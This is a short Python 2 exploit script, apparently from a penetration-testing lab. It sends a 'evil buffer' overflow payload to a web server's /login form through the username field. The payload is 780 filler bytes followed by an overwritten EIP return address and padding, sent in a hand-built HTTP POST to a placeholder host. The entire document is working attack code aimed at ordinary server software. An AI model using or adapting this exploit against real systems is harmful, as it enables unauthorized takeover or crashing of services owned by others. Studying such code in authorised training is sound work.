#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    bufferr = "D" * (1500 - len(filler) - len(eip) - len(offset))
    inputBuffer = filler + eip + offset + bufferr
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: *IP*\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
    buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://*IP*/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("*IP*", 80))
    s.send(buffer)
    s.close()
    print "\nDone!"
except:
    print "\nCould not connect!"
